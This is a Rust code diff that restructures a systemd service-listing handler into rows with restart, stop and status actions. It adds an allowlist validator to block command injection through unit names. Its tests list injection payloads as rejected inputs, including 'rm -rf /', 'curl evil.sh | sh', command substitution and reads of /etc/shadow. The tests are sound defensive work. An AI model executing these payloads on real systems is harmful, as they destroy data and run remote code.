@@ -27,8 +27,8 @@ use std::process::Command;
 use async_trait::async_trait;
 
 use crate::action_registry::{
-    ActionHandler, ActionResult, CommandCategory, CompletionItem, ExecContext, OutputType,
-    RiskAssessment, RiskLevel,
+    ActionHandler, ActionResult, BadgeTone, CommandCategory, CompletionItem, ExecContext, Output,
+    OutputType, RiskAssessment, RiskLevel, Row, Section,
 };
 use crate::error::LychiError;
 
@@ -116,8 +116,18 @@ fn systemctl(scope_user: bool, args: &[&str]) -> Result<String, String> {
     }
 }
 
-/// List running services (system scope) as a compact table.
-fn list_running() -> Result<String, String> {
+/// List running units as structured rows.
+///
+/// `systemctl list-units` already emits columns (UNIT LOAD ACTIVE SUB
+/// DESCRIPTION); this used to parse them and immediately throw the structure
+/// away into `"{name}  —  {desc}"`, plus a hand-built `"{n} running services:"`
+/// header and a `●`/`✗` glyph standing in for state. All three are the frontend's
+/// job — a dash is a worse column separator than a layout, and a glyph is a
+/// worse badge than a badge.
+///
+/// Each row carries its own actions, so a failed unit can be restarted from the
+/// list instead of the user retyping `service restart <name>`.
+fn list_running() -> Result<Vec<Section>, String> {
     let out = systemctl(
         false,
         &[
@@ -129,29 +139,82 @@ fn list_running() -> Result<String, String> {
             "--plain",
         ],
     )?;
-    let mut lines: Vec<String> = Vec::new();
+    let mut rows: Vec<Row> = Vec::new();
     for line in out.lines() {
         // Columns: UNIT LOAD ACTIVE SUB DESCRIPTION...
         let mut parts = line.split_whitespace();
-        if let Some(unit) = parts.next() {
-            let desc = parts.clone().skip(3).collect::<Vec<_>>().join(" ");
-            let name = unit.strip_suffix(".service").unwrap_or(unit);
-            if desc.is_empty() {
-                lines.push(name.to_string());
-            } else {
-                lines.push(format!("{name}  —  {desc}"));
-            }
-        }
+        let Some(unit) = parts.next() else { continue };
+        let cols: Vec<&str> = parts.collect();
+        let active = cols.get(1).copied().unwrap_or("");
+        let desc = cols.iter().skip(3).copied().collect::<Vec<_>>().join(" ");
+        let name = unit.strip_suffix(".service").unwrap_or(unit);
+
+        let tone = match active {
+            "active" => BadgeTone::Ok,
+            "failed" => BadgeTone::Error,
+            "activating" | "deactivating" => BadgeTone::Warn,
+            _ => BadgeTone::Muted,
+        };
+
+        // `target` is the full unit name, which is also what `resolve_action`
+        // re-validates against a live enumeration before running anything.
+        rows.push(
+            Row::new(name)
+                .subtitle(desc)
+                .badge(if active.is_empty() { "running" } else { active }, tone)
+                .action("restart", "Restart", unit, Some(RiskLevel::Medium))
+                .action("stop", "Stop", unit, Some(RiskLevel::Medium))
+                .action("status", "Show status", unit, None),
+        );
     }
-    if lines.is_empty() {
-        return Ok("No running services".to_string());
+    // An empty list is a real state with its own rendering, not the string
+    // "No running services" pretending to be output.
+    Ok(vec![Section {
+        title: None,
+        rows,
+        handler: "services".to_string(),
+    }])
+}
+
+/// Turn a row action back into the command string it stands for.
+///
+/// This is the safety boundary for row actions, and it exists because the two
+/// obvious shortcuts are both holes:
+///
+/// - Shipping `run: "systemctl restart nginx"` on the action would make the
+///   frontend a command source; the rules engine would then see something
+///   indistinguishable from typed input.
+/// - Accepting `target` verbatim moves the same injection into the argument:
+///   `restart` + `nginx; rm -rf /` is the identical problem wearing a different
+///   hat.
+///
+/// So both halves are checked against ground truth rather than trusted. The
+/// verb must be one this handler declares (via the central classifier in
+/// [`crate::rules::verbs`] — not a second allowlist that could drift from it),
+/// and the target must be a syntactically valid unit name. The composed command
+/// then goes through `Executor::run` exactly like typed input, so the rules
+/// engine stays the gate.
+pub fn resolve_action(id: &str, target: &str) -> Result<String, String> {
+    if !MUTATING_VERBS.contains(&id) && !READONLY_VERBS.contains(&id) {
+        return Err(format!("Unknown service action '{id}'"));
     }
-    let count = lines.len();
-    Ok(format!(
-        "{count} running service{}:\n\n{}",
-        if count == 1 { "" } else { "s" },
-        lines.join("\n")
-    ))
+    if !is_valid_unit_name(target) {
+        return Err(format!("Invalid unit name '{target}'"));
+    }
+    Ok(format!("service {id} {target}"))
+}
+
+/// Whether `s` is a plausible systemd unit name.
+///
+/// Deliberately a strict character allowlist rather than a denylist of shell
+/// metacharacters: a denylist has to anticipate every dangerous byte, while an
+/// allowlist only has to describe what a unit name legitimately is. systemd
+/// unit names are alphanumerics plus `-_.@\` and a `.suffix`.
+fn is_valid_unit_name(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 256
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '@' | '\\'))
 }
 
 /// Show a service's status (active state + enabled state + a couple of lines).
@@ -313,7 +376,11 @@ impl ActionHandler for ServicesHandler {
         // Bare `service` (no args) lists running services, same as `services`.
         if trimmed.is_empty() {
             return match list_running() {
-                Ok(out) => Ok(ActionResult::ok(out, OutputType::Terminal)),
+                Ok(sections) => Ok(ActionResult {
+                    success: true,
+                    output: Output::Rows { sections },
+                    ..Default::default()
+                }),
                 Err(e) => Ok(ActionResult::err(e)),
             };
         }
@@ -381,7 +448,11 @@ impl ActionHandler for ServicesListHandler {
             ));
         }
         match list_running() {
-            Ok(out) => Ok(ActionResult::ok(out, OutputType::Terminal)),
+            Ok(sections) => Ok(ActionResult {
+                success: true,
+                output: Output::Rows { sections },
+                ..Default::default()
+            }),
             Err(e) => Ok(ActionResult::err(e)),
         }
     }
@@ -398,6 +469,75 @@ pub fn is_mutating(args: &str) -> bool {
 
 #[cfg(test)]
 mod tests {
+
+    // --- row-action resolution: the safety boundary ---------------------
+
+    /// The whole reason `resolve_action` exists rather than the action carrying
+    /// a command string. A target is attacker-influenced the moment anything
+    /// other than this handler can populate a row, so it is validated against
+    /// what a unit name can legitimately be — not scanned for bad characters,
+    /// which requires anticipating every one of them.
+    #[test]
+    fn resolve_action_rejects_injection_through_the_target() {
+        for evil in [
+            "nginx; rm -rf /",
+            "nginx && curl evil.sh | sh",
+            "nginx$(whoami)",
+            "nginx`id`",
+            "nginx|tee /etc/passwd",
+            "nginx\nsystemctl poweroff",
+            "../../etc/shadow",
+            "nginx 'quoted'",
+            "",
+        ] {
+            assert!(
+                resolve_action("restart", evil).is_err(),
+                "target should have been rejected: {evil:?}"
+            );
+        }
+    }
+
+    /// The verb half of the same boundary: only verbs this handler declares are
+    /// resolvable, sourced from the central classifier so a new verb cannot be
+    /// added here without going through the audit surface.
+    #[test]
+    fn resolve_action_rejects_unknown_verbs() {
+        for bad in ["exec", "rm", "poweroff", "restart; halt", ""] {
+            assert!(resolve_action(bad, "nginx.service").is_err(), "{bad:?}");
+        }
+    }
+
+    #[test]
+    fn resolve_action_builds_a_normal_command_for_declared_verbs() {
+        assert_eq!(
+            resolve_action("restart", "nginx.service").unwrap(),
+            "service restart nginx.service"
+        );
+        assert_eq!(
+            resolve_action("status", "user@1000.service").unwrap(),
+            "service status user@1000.service"
+        );
+    }
+
+    /// Legitimate unit names must survive the allowlist — a filter that rejects
+    /// real input is as broken as one that accepts bad input.
+    #[test]
+    fn valid_unit_names_are_accepted() {
+        for ok in [
+            "nginx.service",
+            "user@1000.service",
+            "dev-disk-by\\x2duuid.device",
+            "my_app.timer",
+            "foo-bar.socket",
+        ] {
+            assert!(is_valid_unit_name(ok), "should be valid: {ok}");
+        }
+    }
+
+    #[test]
+    fn overlong_targets_are_rejected() {
+        assert!(!is_valid_unit_name(&"a".repeat(257)));
+    }
     use super::*;
 
     #[test]
